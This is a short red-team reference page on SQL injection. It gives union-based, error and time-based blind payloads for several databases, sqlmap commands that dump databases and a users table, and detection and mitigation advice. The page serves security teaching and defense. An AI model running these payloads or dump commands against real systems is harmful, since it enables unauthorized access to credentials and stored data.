---
title: "SQL Injection"
category: "red-team"
tags: ["web", "injection", "owasp"]
platform: "web"
mitre: ["T1190"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# SQL Injection

## TL;DR
Untrusted input reaches a SQL query. Types: in-band (union/error), blind (boolean/time), out-of-band. `sqlmap` for automation, but understand it manually.

## Detecting the vulnerability
```sql
'                       -- syntax error?
' OR '1'='1             -- boolean
1' ORDER BY 5-- -        -- column count
1' UNION SELECT NULL,NULL-- -
```

## Exploitation (union)
```sql
-- version and databases
' UNION SELECT NULL,@@version-- -
' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -
-- table columns
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
-- data
' UNION SELECT username,password FROM users-- -
```

## Blind (time-based)
```sql
' OR IF(1=1,SLEEP(5),0)-- -                       # MySQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--               # MSSQL
' || pg_sleep(5)--                                 # PostgreSQL
```

## Automation
```bash
sqlmap -u "https://site/item?id=1" --batch --dbs
sqlmap -r request.txt --dump -T users --threads 4
```

## Detection (Blue Team)
- WAF/logs: `UNION SELECT`, `information_schema`, `SLEEP(`, `WAITFOR`.
- Anomalies: sudden spike in DB errors, long response times (time-based).

## Mitigation / Hardening
- **Parameterized queries / prepared statements** (the basics).
- ORM with binding, input validation/allow-list, least-privilege DB account.
- WAF as an extra layer, not a replacement.

## Sources
- [PortSwigger – SQLi](https://portswigger.net/web-security/sql-injection) · [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
